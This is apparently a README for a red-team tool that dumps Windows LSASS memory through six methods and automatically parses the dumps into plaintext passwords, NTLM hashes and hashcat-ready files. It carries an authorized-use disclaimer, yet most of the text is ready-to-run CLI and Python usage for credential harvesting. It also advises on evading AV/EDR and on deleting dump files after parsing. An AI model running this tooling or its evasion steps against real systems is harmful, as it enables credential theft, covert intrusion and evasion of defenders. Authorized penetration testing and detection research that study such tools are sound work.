# LSASS Dumper Framework

**Multi-Method Credential Harvesting Toolkit**  
Part of the *30 Days of Red Team* Series

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is designed for authorized penetration testing and security research. Unauthorized access to computer systems is illegal. Users are responsible for complying with applicable laws and obtaining proper authorization before use.

---

## 🎯 Overview

A professional-grade LSASS dumping framework supporting multiple extraction methods with varying OPSEC profiles. Automates credential harvesting from Windows systems with intelligent method selection and automatic credential parsing.

### Key Features

- **6 Dump Methods**: From stealthy (comsvcs.dll) to advanced (direct syscalls)
- **Auto Method Selection**: Intelligent fallback based on OPSEC ratings
- **Credential Extraction**: Automatic parsing with pypykatz
- **Professional Architecture**: Modular, extensible, production-ready
- **CLI & Library**: Use as command-line tool or Python library

---

## 📋 Requirements

- **OS**: Windows 10/11, Windows Server 2016+
- **Privileges**: Administrator or SYSTEM
- **Python**: 3.8+
- **Dependencies**: See `requirements.txt`

### External Tools (Optional)

Some methods require additional binaries:

- **ProcDump**: [Sysinternals ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
- **Mimikatz**: [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
- **NanoDump**: [helpsystems/nanodump](https://github.com/helpsystems/nanodump)

---

## 🚀 Installation

### Quick Install

```bash
# Clone repository
git clone https://github.com/yourusername/lsass_dumper_framework.git
cd lsass_dumper_framework

# Install dependencies
pip install -r requirements.txt

# Make executable
chmod +x lsass_dump.py
```

### Package Install

```bash
# Install as package
pip install -e .

# Verify installation
python -c "import lsass_dumper; print(lsass_dumper.__version__)"
```

---

## 💻 Usage

### Command-Line Interface

#### Basic Usage

```bash
# Check privileges and availability
python lsass_dump.py check

# Auto dump with best method
python lsass_dump.py dump --auto

# Dump with specific method
python lsass_dump.py dump --method comsvcs

# Dump and parse automatically
python lsass_dump.py dump --auto --parse
```

#### Parse Existing Dump

```bash
# Parse dump file
python lsass_dump.py parse --file lsass_dumps/lsass_comsvcs_20240115_120000.dmp

# Parse without saving credentials
python lsass_dump.py parse --file dump.dmp --no-save
```

#### Method Information

```bash
# List all methods
python lsass_dump.py list

# Show only available methods
python lsass_dump.py list --available

# Get detailed method info
python lsass_dump.py info --method comsvcs
```

### Python Library Usage

#### Basic Dump

```python
from lsass_dumper import LsassDumper

# Initialize framework
dumper = LsassDumper(output_dir="dumps")

# Check privileges
if not dumper.check_privileges():
    print("Requires administrator privileges")
    exit(1)

# Execute dump
result = dumper.dump(method='comsvcs')

if result:
    print(f"Dump saved: {result['file']}")
    print(f"Size: {result['size'] / 1024 / 1024:.2f} MB")
```

#### Auto Dump with Parsing

```python
from lsass_dumper import LsassDumper

dumper = LsassDumper()

# Auto dump and parse
result = dumper.dump_and_parse(method='auto', auto_parse=True)

if result:
    print(f"Extracted {result['credential_count']} credentials")
    
    # Access credentials
    for cred in result['credentials']:
        user = f"{cred['domain']}\\{cred['username']}"
        print(f"User: {user}")
        
        if 'password' in cred:
            print(f"  Password: {cred['password']}")
        
        if 'nthash' in cred:
            print(f"  NTLM: {cred['nthash']}")
```

#### Method-Specific Usage

```python
from lsass_dumper.methods import ComsvcsDumper, ProcdumpDumper
from pathlib import Path

# Use specific dumper
output_dir = Path("dumps")
dumper = ComsvcsDumper(output_dir)

# Check if available
if dumper.is_available():
    result = dumper.dump()
    
    if result:
        print(f"Success: {result['file']}")
```

---

## 🎭 Dump Methods

### 1. comsvcs.dll (OPSEC: High)

**Native Windows DLL dumping via rundll32**

- ✅ No external tools required
- ✅ Uses signed Microsoft DLL
- ✅ Bypasses many AV/EDR solutions
- ✅ Living-off-the-land technique

```bash
# CLI
python lsass_dump.py dump --method comsvcs

# Python
dumper.dump(method='comsvcs')
```

### 2. NanoDump (OPSEC: High)

**Modern LSASS dumper with EDR evasion**

- ✅ Direct syscalls bypass hooks
- ✅ Handle duplication for stealth
- ✅ Valid signature spoofing
- ⚠️ Requires compiled binary

```bash
# CLI
python lsass_dump.py dump --method nanodump

# Python
dumper.dump(method='nanodump')
```

### 3. PowerShell (OPSEC: Medium)

**Pure PowerShell MiniDumpWriteDump**

- ✅ No external binaries
- ✅ Uses Windows APIs directly
- ⚠️ PowerShell logging captures activity
- ⚠️ AMSI may scan and block

```bash
# CLI
python lsass_dump.py dump --method powershell

# Python
dumper.dump(method='powershell')
```

### 4. ProcDump (OPSEC: Medium)

**Sysinternals ProcDump**

- ✅ Signed by Microsoft
- ✅ Reliable and stable
- ⚠️ Monitored by many EDRs
- ⚠️ Requires uploading binary

```bash
# CLI
python lsass_dump.py dump --method procdump

# Python
dumper.dump(method='procdump')
```

### 5. Mimikatz (OPSEC: Low)

**Classic credential dumping**

- ✅ Well-documented
- ✅ Can extract directly
- ❌ Heavily signatured by AV/EDR
- ❌ Immediate alerts

```bash
# CLI
python lsass_dump.py dump --method mimikatz

# Python
dumper.dump(method='mimikatz')
```

### 6. Direct Syscalls (OPSEC: Very High)

**Advanced technique bypassing userland hooks**

- ✅ Bypasses all userland EDR hooks
- ✅ Highest level of evasion
- ⚠️ Requires custom C/C++ implementation

*Note: This is a placeholder requiring custom implementation.*

---

## 📊 Output Files

The framework generates several output files:

```
lsass_dumps/
├── lsass_comsvcs_20240115_120000.dmp    # Minidump file
├── credentials.txt                       # Plaintext credentials
├── credentials.json                      # JSON format
└── credentials_hashes.txt                # Hashcat format
```

### Credential Formats

**Text Format**:
```
User: DOMAIN\username
Type: msv
Password: P@ssw0rd123
NTLM: a1b2c3d4e5f6...

User: DOMAIN\admin
Type: kerberos
NTLM: f6e5d4c3b2a1...
```

**JSON Format**:
```json
[
  {
    "username": "user",
    "domain": "DOMAIN",
    "type": "msv",
    "password": "P@ssw0rd123",
    "nthash": "a1b2c3d4e5f6..."
  }
]
```

**Hashcat Format**:
```
DOMAIN\username:a1b2c3d4e5f6...
DOMAIN\admin:f6e5d4c3b2a1...
```

---

## 🔧 Advanced Usage

### Custom Output Directory

```python
dumper = LsassDumper(output_dir="/tmp/custom_dumps")
```

### Specify Tool Paths

```python
from lsass_dumper.methods import ProcdumpDumper

dumper = ProcdumpDumper(
    output_dir="dumps",
    procdump_path="C:\\Tools\\procdump64.exe"
)
```

### Parse Without Saving

```python
parser = PyPykatzParser()
credentials = parser.parse_dump("dump.dmp")

# Display only
parser.display_credentials(credentials)
```

---

## 🛡️ OPSEC Considerations

### Detection Vectors

1. **Process Access**: Opening LSASS triggers alerts
2. **File Creation**: Minidump files on disk
3. **PowerShell Logging**: Script block logging captures code
4. **EDR Hooks**: Userland API monitoring

### Evasion Techniques

- **Use comsvcs.dll**: Stealthiest built-in method
- **Encrypt Dumps**: Immediately encrypt minidumps
- **Memory-Only**: Parse in-memory when possible
- **Cleanup**: Delete dumps after parsing
- **Direct Syscalls**: Bypass userland hooks entirely

### Recommended Approach

```python
# 1. Use high-OPSEC method
result = dumper.auto_dump(preferred_method='comsvcs')

# 2. Parse immediately
credentials = dumper.parse_dump(result['file'])

# 3. Clean up
import os
os.remove(result['file'])
```

---

## 📚 Project Structure

```
lsass_dumper_framework/
├── lsass_dumper/
│   ├── __init__.py           # Package exports
│   ├── core.py               # Main framework orchestrator
│   ├── cli.py                # Command-line interface
│   ├── methods/              # Dump method implementations
│   │   ├── __init__.py
│   │   ├── comsvcs.py        # comsvcs.dll method
│   │   ├── procdump.py       # ProcDump method
│   │   ├── powershell.py     # PowerShell method
│   │   ├── mimikatz.py       # Mimikatz method
│   │   ├── nanodump.py       # NanoDump method
│   │   └── syscalls.py       # Direct syscalls (placeholder)
│   ├── parsers/              # Credential extraction
│   │   ├── __init__.py
│   │   └── pypykatz_parser.py
│   └── utils/                # Helper utilities
│       ├── __init__.py
│       ├── privileges.py     # Privilege checking
│       └── process.py        # Process management
├── examples/                 # Usage examples
│   ├── basic_dump.py
│   ├── auto_dump_and_parse.py
│   └── batch_methods.py
├── lsass_dump.py            # Main CLI entry point
├── requirements.txt         # Python dependencies
├── setup.py                 # Package setup
└── README.md               # This file
```

---

## 🤝 Contributing

This framework is part of the "30 Days of Red Team" series. Contributions welcome:

1. Fork the repository
2. Create a feature branch
3. Add tests for new functionality
4. Submit a pull request

---

## 📖 References

- [LSASS Memory Dumping Techniques](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)
- [Pypykatz Documentation](https://github.com/skelsec/pypykatz)
- [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2)
- [30 Days of Red Team Series](https://medium.com/@maxwellcross)

---

## 📄 License

This project is for educational and authorized security testing purposes only.  
See LICENSE file for details.

---

**Happy Hunting! 🎯**  
*From the 30 Days of Red Team Series*
